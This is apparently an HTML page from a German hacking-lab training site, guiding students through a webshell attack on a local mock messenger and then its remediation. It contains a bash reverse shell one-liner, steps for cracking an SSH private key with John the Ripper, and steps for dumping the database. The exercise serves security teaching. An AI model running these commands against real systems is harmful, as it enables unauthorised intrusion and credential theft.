<!DOCTYPE html>
<html lang="de">

<head>
    <title>Virtual Hacker's Lab</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">

    <!-- f√ºr SEO: muss noch ausgef√ºllt werden -->
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta name="author" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/font-awesome.min.css">
    <link rel="stylesheet" href="fonts/fontawesome/css/all.min.css" />
    <link rel="stylesheet" href="css/aos.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

    <!-- MAIN CSS -->
    <link rel="stylesheet" href="css/style.css">
    <link rel="icon" href="favicon.ico" type="images/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@4.19.0/css/xterm.css" />

</head>

<body data-spy="scroll" data-target="#navbarNav" data-offset="50">

    <!-- MENU BAR -->
    <nav class="navbar navbar-expand-lg fixed-top">
        <div class="container">
            <a class="navbar-brand" href="#">
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ml-lg-auto">
                    <li class="nav-item">
                        <a href="index.php" class="nav-link">√úber uns</a>
                    </li>
                    <li class="nav-item">
                        <a href="labore.php" class="nav-link">Labore</a>
                    </li>
                    <li class="nav-item">
                        <a href="#" class="nav-link " data-toggle="modal" data-target="#registerModal">Registrieren</a>
                    </li>
                    <li class="nav-item">
                        <a href="#" class="nav-link" data-toggle="modal" data-target="#loginModal"><i
                                class="fas fa-sign-in-alt"></i> Anmelden</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Button zum √ñffnen des Modals -->
    <a href="#" class="nav-link smoothScroll" data-toggle="modal" data-target="#loginModal"></a>

    <!-- Modal -->
    <div class="modal fade" id="loginModal" tabindex="-1" role="dialog" aria-labelledby="loginModalLabel"
        aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="loginModalLabel">Login</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">

                    <!-- Login-Formular -->
                    <form>
                        <div class="form-group">
                            <label for="email">E-Mail</label>
                            <input type="email" class="form-control" id="email" placeholder="Enter E-Mail">
                        </div>
                        <div class="form-group">
                            <label for="password">Passwort</label>
                            <input type="password" class="form-control" id="password" placeholder="Passwort">
                        </div>
                        <button type="submit" class="btn btn-primary">Einloggen</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <section class="panel-container">
        <div class="panel panel-left">
            <h1 id="√ºbungsanleitung">√úbungsanleitung</h1>
<h2 id="allgemeines-angriff">Allgemeines / Angriff</h2>
<h3 id="webshell">Webshell</h3>
<p>Webshells sind Skripte die, wenn sie auf einen Webserver
eingeschleust werden, einen Fernzugriff (Backdoor) f√ºr einen/eine
Angreifer/-in darstellen. Eine Webshell kann in jeder Programmiersprache
(z.B. ASP, PHP, JSP, Python, Ruby, C++, usw.) geschrieben sein, der
Zielserver sollte jedoch die Sprache unterst√ºtzen, damit die Webshell
ausgef√ºhrt werden kann. Webshells k√∂nnen in verschiedenen Formen
auftreten, eine beliebte Form ist z.B. eine Datei mit nur einer beliebig
Langen Zeile, die dazu noch bspw. base64 codiert ist. Diese Art von
Formatierung verschleiert den Code und erschwert dem/der Leser/-in der
Datei den Code zu verstehen und als Webshell zu enttarnen.</p>
<p>Die Webshell dient in den meisten F√§llen als Einstiegspunkt um
Befehle auszuf√ºhren und um die damit verbundenen M√∂glichkeiten
auszunutzen, wie etwa die Privilegien-Eskalation (Zugriff verschaffen
auf Ressourcen die normalerweise erweiterte Berechtigungen erfordern),
weitere Dateien hochzuladen, sensible Daten zu stehlen, Create, Read,
Update und Delete-Operatoren durchzuf√ºhren oder auch um Programme
auszuf√ºhren.</p>
<p>Durch den Einsatz von Netzwerkwerkzeugen k√∂nnen Angreifer/-innen
Schwachstellen innerhalb eines Webservers finden und diese
Sicherheitsl√ºcken gezielt auszunutzen, um ihre Webshell auf den
Webserver zu transferieren. Sicherheitsl√ºcken wie das Einbinden von
nicht validierten Codes in die Webanwendung (Cross-Site-Scripting) oder
durch eine nicht validierte Dateiupload Funktion, wie es in dieser √úbung
der Fall, ist k√∂nnen dazu genutzt werden, um die Webshell zu
platzieren.</p>
<h3 id="webshell-skript"><strong>Webshell</strong>
<strong>(Skript)</strong></h3>
<p>Eine base64 und in eine Zeile formatierte PHP-Datei. Enth√§lt den Code
um den Angriff f√ºr diese √úbung durchzuf√ºhren.</p>
<h3 id="allgemeine-programme">Allgemeine Programme</h3>
<ul>
<li><p><strong>OpenSSH-Server</strong></p>
<p>SSH (Secure Shell) ist ein Internetprotokoll und dient dem sicheren
Zugriff auf entfernte Rechner. √úber SSH kann eine Terminalsitzung
ge√∂ffnet werden, aber auch Daten sicher kopiert werden.</p>
<p>OpenSSH ist ein Programmpaket f√ºr die Remoteanmeldung via
SSH-Protokoll</p>
<p>Je nach Konfiguration k√∂nnen verschieden
Authentifizierungsm√∂glichkeiten verwendet werden, u.a. die
Zwei-Faktor-Authentisierung oder dem Public-Private-Key
Verfahren.</p></li>
<li><p><strong>Nano</strong></p>
<p>Ein Texteditor, welches die Bearbeitung von Dateien im Terminal
erm√∂glicht</p></li>
</ul>
<h3 id="angreifer-in">Angreifer/-in</h3>
<ul>
<li><p><strong>w3af</strong></p>
<p>Open-Source-Sicherheitsscanner f√ºr Webanwendungen. Erm√∂glicht mittels
Plug-Ins das Scannen einer Webanwendung mit verschiedenen
Modulen.</p></li>
<li><p><strong>Kali Linux</strong></p>
<p>Eine auf Debian basierte Linux Distribution. Kali Linux stellt
Programme f√ºr Penetrationstest zur Verf√ºgung. Die auf dieser
Distribution installierten Programme unterst√ºtzen den/die Angreifer/-in,
in dieser √úbung bei dem Webshell-Angriff.</p>
<ul>
<li><p><strong>Netcat</strong></p>
<p>Netcat, kurz nc, ist ein universelles Kommandozeilenwerkzeug. Es kann
im Terminal oder in Skripten f√ºr die Kommunikation √ºber TCP- und
UDP-Netzwerkverbindungen (IPv4 und 6), aber auch lokale UNIX Domain
Sockets genutzt werden.</p></li>
<li><p><strong>John The Ripper</strong></p>
<p>Ist eine Software um Passw√∂rter zu entschl√ºsseln.</p>
<p>ssh2john.py [<strong>Schl√ºssedatei</strong>] &gt;
[<strong>Zieldatei</strong>] wird in dieser √úbung genutzt um die
Passphrase f√ºr einen privaten Schl√ºssel herauszufinden.</p></li>
<li><p><strong>Wordlist</strong></p>
<p>Zu dt. Passw√∂rterliste ist eine Liste an W√∂rtern, die meist in
Verbindung mit dem W√∂rterbuchangriff genutzt werden, um Passw√∂rter zu
knacken. Die hier verwendete W√∂rterliste ist rockyou.txt.</p></li>
</ul></li>
</ul>
<h3 id="server-seite">Server Seite</h3>
<ul>
<li><p><strong>Webserver</strong></p>
<p>Ziel des Webshell-Angriffs.</p>
<p>Stellt einen Mock-up eines <strong>Messenger</strong> zur
Verf√ºgung.</p>
<p>Der Server enth√§lt mehrere Benutzer/-innen und eine
Datenbankschnittstelle.</p>
<p>Der Server persistiert die hochgeladenen Dateien.</p>
<p>Das Layout des Dateisystems sieht folgenderma√üen aus:</p>
<ul>
<li><p>/<strong>var/www/html</strong>:</p>
<p>Hier liegen die Verzeichnisse und Dateien um die Webapplikation
darzustellen</p></li>
<li><p><strong>/etc</strong>:</p>
<p>Enth√§lt Konfigurationsdateien, z.B. die Dateien
<strong>passwd</strong> (Informationen √ºber alle Benutzerkonten) und
<strong>shadow</strong> (enth√§lt die verschl√ºsselten Passw√∂rter der
Benutzer bzw. Benutzerinnen)</p></li>
<li><p><strong>/home</strong>:</p>
<p>Enth√§lt Homeverzeichnisse. Das Homeverzeichnis f√ºr den root Benutzer
bzw. Benutzerin ist unter /root zu finden.</p></li>
</ul></li>
<li><p><strong>Webapplikation</strong></p>
<p>Eine statische Webseite, ohne Caching. Ein neu laden der Seite setzt
alle an der Webapplikation vorgenommen √Ñnderungen zur√ºck (geschriebene
Nachrichten werden nicht persistiert).</p>
<p>Beinhaltet eine Dateiupload-Funktion.</p>
<p>Der erste angezeigte Chat beinhaltet ein bereits auf den Server
hochgeladenes Bild.</p></li>
<li><p><strong>Datenbank</strong></p>
<p>Eine MySQL-Datenbank. Enth√§lt Daten √ºber die
Nachrichtenapplikation.</p></li>
</ul>
<h3 id="hilfreiche-unix-befehle">Hilfreiche Unix Befehle</h3>
<ul>
<li><strong>bash [Option] [Befehl]</strong>: F√ºhrt ein Befehl in der
Bash Konsole aus
<ul>
<li>bash -c ‚Äú&lt;-Befehl&gt;‚Äù</li>
<li>bash ./<ausf√ºhrbare_datei></li>
</ul></li>
<li><strong>ls [Option]</strong>: Steht f√ºr ‚Äúlist‚Äù, zeigt den Inhalt
eines Verzeichnisses an
<ul>
<li>ls -l ‚Äî&gt; zeigt weitere Informationen zum Inhalt an (z.B.
Dateirechte)</li>
<li>ls -la ‚Äî&gt; zeigt auch versteckte Dateien (z.B. Dateien die mit
einem ‚Äú.‚Äù beginnen)</li>
<li>ls -R ‚Äî&gt; zeigt rekursiv auch den Inhalt von Unterordnern an</li>
</ul></li>
<li><strong>cd [Verzeichnis(-Pfad)]</strong>: Steht f√ºr ‚Äúchange
directory‚Äù, z.dt. ‚ÄúVerzeichnis wechseln‚Äù
<ul>
<li>cd .. ‚Äî&gt; wechselt bspw. in das √ºbergeordnete Verzeichnis</li>
</ul></li>
<li><strong>cat [Datei(-Pfad)]</strong>: Kann dazu genutzt werden um den
Inhalt einer Datei auszugeben</li>
<li><strong>./<Datei></strong>: F√ºhrt die Datei aus</li>
<li><strong>chmod [Option] [Ziel]:</strong> Ver√§ndert Zugriffsrechte f√ºr
Verzeichnisse und Dateien
<ul>
<li>chmod +x [Ziel] ‚Äî&gt; F√ºgt die Berechtigung zum Ausf√ºhren hinzu</li>
</ul></li>
<li><strong>wc [Option] [Datei]:</strong> Steht f√ºr ‚Äúword count‚Äù, z√§hlt
W√∂rter, Zeichen und Bytes
<ul>
<li>wc -l [Datei] ****‚Äî&gt; z√§hlt die Zeilen in der Datei</li>
<li>wc -w [Datei] ****‚Äî&gt; z√§hlt die W√∂rter in der Datei</li>
</ul></li>
<li><strong>rm</strong> <strong>[Option]</strong>
<strong>[Datei/Verzeichnis]</strong>: L√∂scht eine Datei oder ein
Verzeichnis
<ul>
<li>rm [Datei] ‚Äî&gt; l√∂scht eine Datei</li>
<li>rm -rf [Verzeichnis] ‚Äî&gt; l√∂scht Verzeichnis rekursiv und ohne
Nachfrage</li>
</ul></li>
</ul>
<h2 id="aufbau-der-√ºbung">Aufbau der √úbung</h2>
<p>In dieser √úbung werden Sie verschiedene Perspektiven einnehmen. Die
‚Äúnormalen‚Äù Nutzer/-innen (Einf√ºhrung), die die Webanwendung als
Nachrichtenapplikation nutzen. Die Angreifer/-innen Perspektive
(Webshell-Angriff), die einen Angriff auf den Webserver durchf√ºhren und
schlussendlich die Perspektive eines/r Serveradministrator/-in, welche
die Sicherheitsl√ºcke behebt.</p>
<h3 id="einf√ºhrung">Einf√ºhrung</h3>
<p>√ñffnen Sie die Webseite ‚Äúlocalhost:8082‚Äù in einem Browser Ihrer Wahl,
in dem Sie die genannte URL in die Suchleiste eingeben. Machen Sie sich
mit der Webseite und deren Funktionen vertraut.</p>
<div class="sourceCode" id="cb1"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">üí°</span> Mit Hilfe der Netzwerkanalyse aus den eingebauten Entwicklerwerkzeugen des Browsers k√∂nnen HTTP Anfragen und Antworten der Webseite verfolgt werden.</span></code></pre></div>
<p>üë§ <strong>(Perspektive: Anwender/-in)</strong></p>
<p>Laden Sie vorerst einmal eine normale Bilddatei hoch, in dem Sie
unten links in der Chatleiste auf die B√ºroklammer klicken. Es erscheint
ein grauer Screen. Dr√ºcken Sie erneut auf die B√ºroklammer um ein Bild
auszuw√§hlen. Mit einem Klick auf den Papierflieger l√§sst sich das Bild
hochladen.</p>
<h3 id="webshell-angriff">Webshell-Angriff</h3>
<ol type="1">
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>Loggen Sie sich in den w3af Container und f√ºhren Sie das Skript
<strong>w3af_console</strong> aus, indem Sie folgenden Befehl</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./w3af_console</span></span></code></pre></div>
<p>im Terminal ausf√ºhren.</p>
<p>Mit dem Befehl</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="bu">help</span> <span class="pp">[</span><span class="ss">Option</span><span class="pp">]</span></span></code></pre></div>
<p>werden Ihnen die verschiedenen Befehle und deren Beschreibung von
w3af angezeigt. Die drei Befehle, die Sie in dieser √úbung verwenden
werden sind <strong>Plug-Ins</strong>, <strong>target</strong> und
<strong>start</strong>.</p>
<p>Geben Sie <strong>Plug-Ins</strong> in das Terminal ein, Sie sollten
nun in der Plug-Ins Oberfl√§che sein. Mit einer weiteren Eingabe von
<strong>help</strong> werden Ihnen die verschieden Scanmodule angezeigt.
Aktivieren Sie die Module <strong>web_spider</strong> und
<strong>file_upload</strong>, in dem Sie die Befehle</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">crawl</span> web_spider</span></code></pre></div>
<p>und</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> file_upload</span></code></pre></div>
<p>nacheinander ausf√ºhren.</p>
<p>Mit <strong>back</strong> gelangen Sie wieder in die vorherige
Oberfl√§che.</p>
<p>Finden Sie Ihre lokale IP-Adresse heraus und setzten sie diese als
Ihr Ziel.</p>
<p>Daf√ºr m√ºssen Sie den Befehl <strong>target</strong> eingeben, gefolgt
von dem Befehl</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> target http://<span class="op">&lt;</span>local_ip_adresse<span class="op">&gt;</span>:8082</span></code></pre></div>
<p>Mit der Eingabe von <strong>view</strong> lassen sich die Ziele
einsehen.</p>
<p>Kehren Sie wieder in die urspr√ºngliche Oberfl√§che zur√ºck
(<strong>back</strong>) und starten Sie den Scan √ºber den Befehl
<strong>start.</strong></p>
<p>Das Ergebnis des Scans sollte Ihnen die folgenden zwei Fragen:</p>
<ul>
<li>Existiert eine Dateiupload-Funktion auf der Ziel-Webanwendung;</li>
<li>Welche URLs existieren f√ºr die Ziel Webanwendung und wo werden
eventuell von dem/der Benutzer/-in hochgeladene Dateien
abgespeichert</li>
</ul>
<p>beantworten.</p></li>
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>Laden Sie die Webshell (webshell.php) √ºber die Upload Funktion der
Webseite auf den Webserver und √∂ffnen Sie das Skript √ºber den Browser,
indem Sie in der Suchleiste die URL</p>
<pre><code>[localhost:8082](http://localhost:8082)/[storage_path]/[file_name] </code></pre>
<p>eingeben. Das Passwort um f√ºr die Autorisierung der Webshell ist:
‚Äú<strong>j<sub>82BQC;3N&lt;`HK</sub></strong>‚Äù.</p>
<p>Sammeln Sie Informationen √ºber den Server, indem Sie die oben
genannten <strong>Unix Befehle</strong> verwenden um sich durch das
Dateisystem zu navigieren. Die wichtigen Verzeichnisstrukturen ist im
Abschnitt <strong>Server Seite,</strong> unter <strong>Allgemeines /
Angriff,</strong> des Dateisystems oben beschrieben.</p>
<p>Um die Informationssuche zu automatisieren k√∂nnen Sie das Skript
<strong>linpeas.sh</strong> hochladen und ausf√ºhren. Sie k√∂nnen das
Skript auch √ºber die Webseite hochladen oder die Upload-Funktion der
Webshell nutzen. Das Skript befindet sich nach dem Hochladen im selben
Verzeichnis, wie die Webshell. Verwenden Sie folgenden Befehl verwenden
zum ausf√ºhren des Skriptes.</p>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> ./linpeas.sh</span></code></pre></div>
<div class="sourceCode" id="cb9"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">üí°</span> Optional <span class="at">-</span> Reverse Shell: </span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Loggen</span> Sie sich in den Kali Linux Container ein und lassen Sie sich die IP-Adress des Containers mit dem Befehl hostname <span class="at">-i</span> ausgeben. </span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Anschlie√üend</span> k√∂nnen Sie den Befehl nc <span class="at">-lnvp</span> <span class="pp">[</span><span class="ss">port</span><span class="pp">]</span> ausf√ºhren. Kali Linux lauscht nun auf dem angegebenen Port nach eingehenden Verbindungen. </span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Sende</span> Senden Sie den Befehl </span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span> <span class="at">-c</span> <span class="st">&quot;bash -i &gt;&amp; /dev/tcp/[client_ip]/[port] 0&gt;&amp;1&quot;</span></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="ex">√ºber</span> die Webshell im Browser an den Server. Der Server baut dadurch eine Verbindung zu einer IP-Adresse auf angebenden Port auf und √ºbergibt der Zieladresse ein Terminal, in dem Fall ein bash Terminal. Im Terminal des Clients sollte, wenn alles funktioniert, eine Verbindung zum Webserver hergestellt worden </span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="ex">sein.</span> Nun k√∂nnen Sie statt im Browser √ºber eine Webseite Ihre Anfragen zu stellen, dies in einem Terminal tun. linpeas.sh wird bei Ausf√ºhrung auf der Reverse Shell </span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="ex">koloriert</span> bzw. formatiert angezeigt.</span></code></pre></div>
<p>linpeas.sh gibt Ihnen interessante Informationen, wie
Systeminformationen, gefundene Dateien von Relevanz und andere n√ºtzliche
Informationen wieder (farblich gekennzeichnet, wenn Sie das Skript in
einem Terminal ausgeben lassen).</p>
<p>Suchen Sie in der Ausgabe nach Authentifizierungsinformation f√ºr die
Datenbank und Schl√ºssel f√ºr eine SSH Verbindung.</p>
<p>Lokalisieren Sie das SSH Verzeichnis, des Eigent√ºmers der Schl√ºssel
und √ºberpr√ºfen Sie die Rechte der Dateien. Kopieren Sie sich den
privaten Schl√ºssel</p>
<p>√ñffnen Sie im Kali Linux Container ein Terminal um eine SSH
Verbindung zum Webserver herzustellen.</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="op">&lt;</span>username<span class="op">&gt;</span>@<span class="op">&lt;</span>webserver_ip_adress<span class="op">&gt;</span></span></code></pre></div>
<p>Die SSH Verbindung scheint passwortgesch√ºtzt zu sein.</p></li>
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>In diesem Schritt werden Sie das Passwort des privaten Schl√ºssels
knacken.</p>
<p>Erstellen Sie daf√ºr eine Datei (z.b. <SSH_USERNAME>.id_rsa) im Kali
Linux Container und f√ºgen Sie den vom Webserver kopierten Schl√ºssel in
die erstellte Datei ein. Navigieren Sie hierf√ºr in das
Homeverzeichnis.</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /home <span class="kw">&amp;&amp;</span> <span class="fu">nano</span> <span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa</span></code></pre></div>
<p>Das Programm John The Ripper kann die Schl√ºsseldatei nicht direkt
verarbeiten. Deshalb muss der Schl√ºssel zuerst in einen Hash umgewandelt
werden, den John The Ripper interpretieren kann.</p>
<p>Nutzen Sie daf√ºr ssh2john.py. Mit dem Befehl</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python</span> ssh2john.py [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.id_rsa] <span class="op">&gt;</span> [<span class="op">&lt;</span>ssh_username<span class="op">&gt;</span>.hash] </span></code></pre></div>
<p>wird eine Datei, welche einen kryptografisch verschl√ºsselten
Schl√ºssel enth√§lt, in einen Hash umgewandelt und in die zweite Datei
geschrieben.</p>
<div class="sourceCode" id="cb13"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a> <span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt <span class="pp">[</span><span class="ss">hash_file</span><span class="pp">]</span></span></code></pre></div>
<p>Entnehmen Sie der Ausgabe die Passphrase und probieren Sie erneut
sich √ºber SSH mit dem Server zu verbinden. Bei erfolgreicher Anmeldung
sehen Sie das Terminal des Webservers.</p></li>
<li><p><strong>Schritt:</strong> üòà <strong>(Perspektive:
Angreifer/-in)</strong></p>
<p>In letzten Schritt der Angreifer/-innen Perspektive werden Sie
versuchen Daten aus der Datenbank zu lesen.</p>
<p>Verbinden Sie sich mit der Datenbank, indem Sie die
Authentifizierungsinformationen aus Schritt Zwei in den folgenden Befehl
einf√ºgen und ausf√ºhren.</p>
<div class="sourceCode" id="cb14"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">mysql</span> <span class="at">-u</span> <span class="pp">[</span><span class="ss">username</span><span class="pp">]</span> <span class="at">-p</span> <span class="at">-h</span> <span class="pp">[</span><span class="ss">host_name</span><span class="pp">]</span> <span class="pp">[</span><span class="ss">database_name</span><span class="pp">]</span></span></code></pre></div>
<p>Geben Sie das Passwort bei der Aufforderung ein und best√§tigen Sie
dies mit der Enter-Taste.</p>
<p>N√ºtzliche SQL-Befehle:</p>
<div class="sourceCode" id="cb15"><pre
class="sourceCode sql"><code class="sourceCode sql"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>SHOW <span class="kw">TABLES</span>;</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> [database_name].[table_name];</span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Die Funktionen ST_X(position) und ST_Y(position) <span class="op">..</span>. wandelt das Attribut  </span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> <span class="ot">&quot;position&quot;</span> <span class="kw">in</span> latitude und longitude (Koordinaten) um</span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> z.B. <span class="kw">SELECT</span> ST_X(position), ST_Y(position) <span class="kw">FROM</span> [table_name]</span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Weitere Abfragen finden Sie <span class="kw">in</span> den Dateien, <span class="kw">in</span> dem die </span>
<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="op">//</span> Authentifizierungsinformation gefunden wurden.</span></code></pre></div>
<p>Mit <strong>exit</strong> verlassen Sie die MySQL Oberfl√§che
wieder.</p></li>
</ol>
<h3 id="behebung-der-sicherheitsl√ºcke">Behebung der
Sicherheitsl√ºcke</h3>
<p>üõ†Ô∏è <strong>(Perspektive: Serveradministrator/-in)</strong></p>
<p>Im finalen Schritt dieser √úbung wechseln Sie in die Rolle eines/r
Serveradministrator/-in.</p>
<p>Wichtig ist es, dass die hier gezeigten Ma√ünahmen unvollst√§ndig sind
um einen ausreichenden Schutz gegen√ºber dieser Sicherheitsl√ºcke zu
gew√§hren. Die Ma√ünahmen sind jedoch ausreichend f√ºr den Anwendungsfall
dieser √úbung.</p>
<ol type="1">
<li><p><strong>Ma√ünahme</strong></p>
<p>Erstellen Sie eine .htaccess Datei mit unten angef√ºhrtem Inhalt</p>
<div class="sourceCode" id="cb16"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> /var/www/html/public/uploads/images/.htaccess</span></code></pre></div>
<p>Inhalt der .htaccess Datei:</p>
<pre><code>RemoveHandler .php .phtml .php3
RemoveType .php .phtml .php3
php_flag engine off</code></pre>
<p>Die htaccess Datei ist eine Konfigurationsdatei f√ºr einen Apache
Server. Sie enth√§lt Konfigurationen und Regeln bez√ºglich des
Verzeichnisses. Die htaccess Datei wird bei jeder Anfrage an den Server
ausgewertet und angewandt.</p>
<p>Probieren Sie die Webshell noch einmal √ºber den Browser
aufzurufen.</p>
<p>Der Inhalt der Datei verhindert das Ausf√ºhren von .ph* (PHP) Dateien
in dem Verzeichnis.</p></li>
<li><p><strong>Ma√ünahme</strong></p>
<p>Eine unkontrollierte Dateiupload Funktion kann wie Sie in den
vorherigen Schritten gesehen haben, unkontrollierte Auswirkungen haben.
Deshalb werden Sie in diesem Schritt eine Dateiupload Validierung
einf√ºgen.</p>
<p>Lokalisieren Sie hierf√ºr die Datei <strong>upload.php</strong> im
Verzeichnis <strong>/var/www/html/php.</strong></p>
<p>Bearbeiten Sie diese Datei mit <strong>nano.</strong></p>
<p>Lokalisieren Sie die Zeilen:</p>
<div class="sourceCode" id="cb18"><pre
class="sourceCode php"><code class="sourceCode php"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>uploadUnSanitized(<span class="va">$fileStorage</span><span class="ot">,</span> <span class="va">$fileName</span><span class="ot">,</span> <span class="va">$tmpFileName</span>)<span class="ot">;</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="co">// uploadSanitized($fileStorage, $fileName, $tmpFileName);</span></span></code></pre></div>
<p>Kommentieren Sie die Funktion</p>
<div class="sourceCode" id="cb19"><pre
class="sourceCode php"><code class="sourceCode php"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>uploadUnSanitized(<span class="va">$fileStorage</span><span class="ot">,</span> <span class="va">$fileName</span><span class="ot">,</span> <span class="va">$tmpFileName</span>)<span class="ot">;</span></span></code></pre></div>
<p>aus und die Funktion</p>
<div class="sourceCode" id="cb20"><pre
class="sourceCode php"><code class="sourceCode php"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>uploadSanitized(<span class="va">$fileStorage</span><span class="ot">,</span> <span class="va">$fileName</span><span class="ot">,</span> <span class="va">$tmpFileName</span>)<span class="ot">;</span></span></code></pre></div>
<p>ein (<strong>‚Äú//‚Äù</strong> vor der Funktion entfernen/setzten).</p>
<p>In der uploadSanitized()-Funktion wird der mimeType (Dateityp z.B.
image/jpeg), welcher √ºber die HTTP-Anfrage gesetzt wird, gepr√ºft und
validiert. Bei erfolgreicher Validierung (Dateityp ist ein Bildformat)
wird der Dateiname und Dateiendung neu gesetzt und anschlie√üend wird die
Datei abgespeichert.</p>
<p>Der Webserver antwortet mit einem <strong>HTTP 200 OK</strong> beim
erfolgreichen hochladen einer validen Datei und ein <strong>HTTP 400 Bad
Request</strong> beim Hochladen einer nicht validen Bilddatei.</p>
<p>L√∂schen Sie nun die von Ihnen hochgeladene Webshell und linpeas.sh
Skript.</p>
<p>Die Sicherheitsl√ºcke ist f√ºr den Anwendungsfall dieser √úbung
gestoppt.</p></li>
</ol>
<h3 id="erneuter-angriffsversuch"><strong>Erneuter
Angriffsversuch</strong></h3>
<p>üòà <strong>(Perspektive: Angreifer/-in)</strong></p>
<p>Probieren Sie die Webshell noch einmal √ºber den Browser
hochzuladen.</p>
<p>Der Webserver sollte Ihnen das hochladen einer nicht validen Datei
verwehren.</p>
<p><strong>Sie haben nun das Ende der √úbung erreicht.</strong> üéä</p>
<h1 id="√ºbungsanleitung-1">√úbungsanleitung</h1>
<h2 id="allgemeines-angriff-1">Allgemeines / Angriff</h2>
